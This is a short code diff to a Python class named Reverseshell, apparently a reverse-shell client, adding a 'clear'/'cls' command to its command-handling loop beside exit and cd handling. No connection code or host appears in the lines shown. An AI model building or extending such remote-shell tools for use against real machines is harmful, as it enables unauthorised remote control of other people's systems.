@@ -16,6 +16,8 @@ class Reverseshell:
             if command == "exit" or command == "quit" or command == "q" or command == "stop":
                 run_shell = False
                 break
+            elif command == "clear" or command == "cls":
+                os.system("cls")
             elif command.startswith("cd"):
                 self.change_dir(command)
             elif command == "":
